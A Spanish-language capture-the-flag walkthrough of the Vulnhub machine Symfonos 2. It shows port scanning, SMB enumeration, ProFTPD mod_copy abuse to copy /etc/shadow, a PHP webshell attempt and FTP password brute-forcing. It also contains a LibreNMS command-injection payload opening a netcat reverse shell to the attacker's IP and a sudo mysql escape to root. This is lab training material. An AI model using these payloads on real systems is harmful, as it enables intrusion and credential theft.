# SYMFONOS-2
Desarrollo del CTF SYMFONOS 2

## 1. Configuración de la VM

- Download la VM: https://www.vulnhub.com/entry/symfonos-2,331/

## 2. Escaneo de Puertos

### 2.1. Escaneo TCP

```
nmap -n -P0 -p- -sC -sV -O -T5 -oA full 10.10.10.151
Nmap scan report for 10.10.10.151
Host is up (0.00049s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp  open  http        WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 00:0C:29:A7:84:20 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos2
|   NetBIOS computer name: SYMFONOS2\x00
|   Domain name: \x00
|   FQDN: symfonos2
|_  System time: 2021-03-28T07:57:09-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-28T12:57:09
|_  start_date: N/A

```

<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos1.jpg" with=80% />

### 2.2. Escaneo UDP

```
nmap -vv --reason -Pn -sU -sV -p 161 "--script=banner,(snmp* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN /root/Burpsuite/autorecon/10.10.10.151/scans/udp_161_snmp-nmap.txt -oX /root/Burpsuite/autorecon/10.10.10.151/scans/xml/udp_161_snmp_nmap.xml 10.10.10.151
Nmap scan report for 10.10.10.151
Host is up, received arp-response (0.00018s latency).
Scanned at 2021-03-28 09:02:15 EDT for 23s

PORT    STATE SERVICE REASON       VERSION
161/udp open  snmp    udp-response net-snmp; net-snmp SNMPv3 server
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 31ef6e1b567c305d00000000
|   snmpEngineBoots: 7
|_  snmpEngineTime: 12m51s
MAC Address: 00:0C:29:A7:84:20 (VMware)
```

> Llama la antención SNMP, sin embargo, al ser la versión 03 requerimos usuario y contraseña.

## 3. Proceso de Enumeración

### 3.1. Enumeración NETBIOS / SMB

- Enumeramos con ENUM4LINUX (se muestra sólo lo mas importante)

```
enum4linux -a -M -l -d 10.10.10.151
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Mar 28 08:57:54 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.151
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ========================================= 
|    Share Enumeration on 10.10.10.151    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      
	IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.10.151
//10.10.10.151/print$	Mapping: DENIED, Listing: N/A
//10.10.10.151/anonymous	Mapping: OK, Listing: OK
//10.10.10.151/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\aeolus (Local User)
Use of uninitialized value $user_info in pattern match (m//) at ./enum4linux.pl line 932.

S-1-22-1-1001 Unix User\cronus (Local User)
Use of uninitialized value $user_info in pattern match (m//) at ./enum4linux.pl line 932.

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
```

- Identificamos dos usuarios: aeolus y cronus.

<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos2.jpg" with=80% />

> Vamos a revisar la carpeta compartida identificada:

```
root@kali:~/SYMFONOS2# smbclient \\\\10.10.10.151\\anonymous
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Mar 28 11:26:10 2021
  ..                                  D        0  Sun Mar 28 14:11:10 2021
  backups                             D        0  Thu Jul 18 10:25:17 2019

		19728000 blocks of size 1024. 16273024 blocks available
smb: \> cd backups
smb: \backups\> ls
  .                                   D        0  Thu Jul 18 10:25:17 2019
  ..                                  D        0  Sun Mar 28 11:26:10 2021
  log.txt                             N    11394  Thu Jul 18 10:25:16 2019

		19728000 blocks of size 1024. 16273020 blocks available
smb: \backups\> get log.txt
getting file \backups\log.txt of size 11394 as log.txt (5563.2 KiloBytes/sec) (average 5563.5 KiloBytes/sec)
```

<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos3.jpg" with=80% />

- El archivo "log.txt" comienza de manera peculiar. Apuntamos que hay un backup del archivo SHADOW.

<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos4.jpg" with=80% />

- También identificamos la carpeta en donde se comparte la carpeta anonymous "/home/aeolus/share"

<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos6.jpg" with=80% />


### 3.2. Enumeración FTP

- Buscamos en EXPLOIT-DB la versión del FTP. Encontramos una vulnerabilidad que podría permitirnos cargar una webshell y/o copiar archivos.

<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos5.jpg" with=80% />

- Copiamos el archivo SHADOW.BAK 

```
root@kali:~/SYMFONOS2# nc 10.10.10.151 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.10.151]
site cpfr /var/backups/shadow.bak /home/aeolus/share/shadow.bak
550 /var/backups/shadow.bak /home/aeolus/share/shadow.bak: No such file or directory
site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
site cpto /home/aeolus/share/shadow.bak
250 Copy successful
```

- Copiamos el archivo PASSWD

```
root@kali:~/SYMFONOS2# nc 10.10.10.151 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.10.151]
site cpfr /etc/passwd /home/aeolus/share/passwd.bak
550 /etc/passwd /home/aeolus/share/passwd.bak: No such file or directory
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto /home/aeolus/share/passwd.bak
250 Copy successful
```

> Descargarmos los archivos copiados.

```
root@kali:~/SYMFONOS2/autorecon/10.10.10.151/scans# smbclient \\\\10.10.10.151\\anonymous
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Mar 28 17:37:41 2021
  ..                                  D        0  Sun Mar 28 17:25:51 2021
  backups                             D        0  Thu Jul 18 10:25:17 2019
  passwd.bak                          N     1614  Sun Mar 28 17:36:40 2021
  shadow.bak                          N     1173  Sun Mar 28 17:30:34 2021

		19728000 blocks of size 1024. 16272996 blocks available
smb: \> get passwd.bak
getting file \passwd.bak of size 1614 as passwd.bak (525.4 KiloBytes/sec) (average 525.4 KiloBytes/sec)
smb: \> get shadow.bak
getting file \shadow.bak of size 1173 as shadow.bak (572.7 KiloBytes/sec) (average 544.3 KiloBytes/sec)
```

<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos7.jpg" with=80% />


IMPORTANTE: También intenté subir una webshell pero no se puede por los permisos.

```
root@kali:~/SYMFONOS2# nc 10.10.10.151 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.10.151]
site cpfr /proc/self/cmdline
350 File or directory exists, ready for destination name
site cpto /tmp/.<?php echo passthru($_GET['cmd']); ?>
250 Copy successful
site cpfr /tmp/.<?php echo passthru($_GET['cmd']); ?>
350 File or directory exists, ready for destination name
site cpto /var/www/html/webshell.php
550 cpto: Permission denied
```

### 3.3 Enumeración HTTP

- GOBUSTER y DIRSEARCH no arrojan información importante.

```
root@kali:~/SYMFONOS2/autorecon/10.10.10.151/scans# cat tcp_80_http_gobuster.txt 
/index.html (Status: 200) [Size: 183]
/index.html (Status: 200) [Size: 183]
```

## 4. Identificando la Vulnerabilidad y Ganar Acceso

### 4.1. Cracking OFFLINE

- Vamos aprovechar que hemos podido descargar los archivos PASSWD.BAK y SHADOW.BAK y para a crackearlos.

```
root@kali:~/SYMFONOS2# john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Remaining 2 password hashes with 2 different salts
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads

```

Importante: demoraba mucho el proceso asi que lo realicé con HYDRA.

```
root@kali:~/SYMFONOS2# hydra -t 10 -l aeolus -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.151
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-28 19:20:57
[DATA] max 10 tasks per 1 server, overall 10 tasks, 14344399 login tries (l:1/p:14344399), ~1434440 tries per task
[DATA] attacking ftp://10.10.10.151:21/
[21][ftp] host: 10.10.10.151   login: aeolus   password: sergioteamo
```

<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos16.jpg" with=80% />


> Obtenemos las siguientes credenciales aeolus:sergioteamo. 

### 4.2. SSH FORDWADING

- Con las credenciales obtenidas nos conectamos por SSH.

```
root@kali:~/SYMFONOS2# ssh aeolus@10.10.10.151
aeolus@10.10.10.151's password: 
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Mar 28 13:14:23 2021 from ::1
aeolus@symfonos2:~$ whoami
aeolus
```

<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos8.jpg" with=80% />

- Iniciamos a buscar mecanismos de elevar privilegios o acceder a otro usuario del sistema.
- El servidor tiene NMAP instalado. Extrañamente identificados más puertos abiertos que no habíamos visto en el escaneo inicial.

```
aeolus@symfonos2:~$ nmap -sV localhost

Starting Nmap 7.40 ( https://nmap.org ) at 2021-03-28 17:08 CDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000080s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 992 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
25/tcp   open  smtp        Exim smtpd 4.89
80/tcp   open  http        WebFS httpd 1.21
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.1.38-MariaDB-0+deb9u1
8080/tcp open  http        Apache httpd 2.4.25 ((Debian))
Service Info: Host: symfonos2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.48 seconds
aeolus@symfonos2:~$ ss -t -l -n
State       Recv-Q Send-Q                            Local Address:Port                                           Peer Address:Port              
LISTEN      0      80                                    127.0.0.1:3306                                                      *:*                  
LISTEN      0      128                                           *:5355                                                      *:*                  
LISTEN      0      50                                            *:139                                                       *:*                  
LISTEN      0      128                                   127.0.0.1:8080                                                      *:*                  
LISTEN      0      32                                            *:21                                                        *:*                  
LISTEN      0      128                                           *:22                                                        *:*                  
LISTEN      0      20                                    127.0.0.1:25                                                        *:*                  
LISTEN      0      50                                            *:445                                                       *:*                  
LISTEN      0      128                                          :::5355                                                     :::*                  
LISTEN      0      50                                           :::139                                                      :::*                  
LISTEN      0      64                                           :::80                                                       :::*                  
LISTEN      0      128                                          :::22                                                       :::*                  
LISTEN      0      20                                          ::1:25                                                       :::*                  
LISTEN      0      50                                           :::445                                                      :::*   
```

<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos9.jpg" with=80% />

> Los puertos TCP/8080, TCP/3306 y TCP/25 solo son accedidos de manera local y no por la red.

- Realizamos un LOCAL PORT FORWARDING de los puertos que sólo se pueden acceder de manera local.


```
aeolus@symfonos2:~$ ssh -L 10.10.10.151:8080:127.0.0.1:8080 aeolus@localhost
aeolus@localhost's password: 
Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Mar 28 17:28:59 2021 from ::1
```

<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos10.jpg" with=80% />

- Ahora al ejecutar NMAP podemos identificar el puerto 8080 abierto.

```
oot@kali:~/SYMFONOS2# nmap -n -p 8080 -sV 10.10.10.151
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-28 18:38 EDT
Nmap scan report for 10.10.10.151
Host is up (0.00025s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.25 ((Debian))
MAC Address: 00:0C:29:A7:84:20 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.79 seconds
```

<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos11.jpg" with=80% />


### 4.3. Acceso a LIBRENMS

- LIBRENMS tiene vulnerabilidades del tipo RCE y SQL injection.

<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos12.jpg" with=80% />


- La vulnerabilidad de RCE está detallada aquí: https://www.exploit-db.com/exploits/47044. Requiere autenticar en el sistema.
- IMPORTANTE: Toca leer el detalle de la vulnerabilidad y entender el SCRIPT. Auntenticamos el usuario aeolus:sergioteamo.
- Para explotar la vulnerabilidad debemos añadir un dispositivo.

```
'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.133 443 >/tmp/f) #

10.10.10.133: IP de KALI
443: Puerto Remoto para la conexión reversa
```

<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos13.jpg" with=80% />

- Luego llamamos al archivo y establecemos la conexión rerversa.

```
10.10.10.151:8080/ajax_output.php?id=capture&format=text&type=snmpwalk&hostname=10.10.10.16

root@kali:~/SYMFONOS2# netcat -lvp 443
Connection from 10.10.10.151:37588
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)

```

<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos14.jpg" with=80% />


## 5. Elevar Privilegios

- Ahora que tenemos acceso con el usuario CRONUS vamos a intentar elevar privilegios nuevamente.

### 5.1. Elevar a través de SUDO

```
cronus@symfonos2:/opt/librenms/html$ sudo -l
sudo -l
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql

```

- Ejecutamos el comando mencionado y podemos tener acceso a MYSQL. Después de buscar información sensible, NO ENCONTRÉ NADA.

```
cronus@symfonos2:/opt/librenms/html$ sudo /usr/bin/mysql
sudo /usr/bin/mysql
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 319
Server version: 10.1.38-MariaDB-0+deb9u1 Debian 9.8

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| librenms           |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.00 sec)
```

> Ejecutamos /bin/sh a través de MYSQL y obtenemos acceso.

```
$ sudo -l 
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql
$ sudo /usr/bin/mysql -e "!\ /bin/sh"
ERROR at line 1: Unknown command '\ '.
$ sudo /usr/bin/mysql -e "! /bin/sh"
ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '! /bin/sh' at line 1
$ sudo /usr/bin/mysql -e "!/ /bin/sh"
ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '!/ /bin/sh' at line 1
$ sudo /usr/bin/mysql "\! /bin/sh"
ERROR 1049 (42000): Unknown database '\! /bin/sh'
$ sudo /usr/bin/mysql -e "\! /bin/sh"
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
cat proof.txt

	Congrats on rooting symfonos:2!

           ,   ,
         ,-`{-`/
      ,-~ , \ {-~~-,
    ,~  ,   ,`,-~~-,`,
  ,`   ,   { {      } }                                             }/
 ;     ,--/`\ \    / /                                     }/      /,/
;  ,-./      \ \  { {  (                                  /,;    ,/ ,/
; /   `       } } `, `-`-.___                            / `,  ,/  `,/
 \|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;
  `        { {                                     __  /  ,`/   ,`,;
        /   \ \                                 _,`, `{  `,{   `,`;`
       {     } }       /~\         .-:::-.     (--,   ;\ `,}  `,`;
       \\._./ /      /` , \      ,:::::::::,     `~;   \},/  `,`;     ,-=-
        `-..-`      /. `  .\_   ;:::::::::::;  __,{     `/  `,`;     {
                   / , ~ . ^ `~`\:::::::::::<<~>-,,`,    `-,  ``,_    }
                /~~ . `  . ~  , .`~~\:::::::;    _-~  ;__,        `,-`
       /`\    /~,  . ~ , '  `  ,  .` \::::;`   <<<~```   ``-,,__   ;
      /` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                       \\, `,__
     / ` , ,`\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \
    / , ~ . ~ \ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``
  /` ` . ~ . ` `\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___
/` . `  ,  . ~ , \  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,

	Contact me via Twitter @zayotic to give feedback!

```

<img src="https://github.com/El-Palomo/SYMFONOS-2/blob/main/symfonos15.jpg" with=80% />




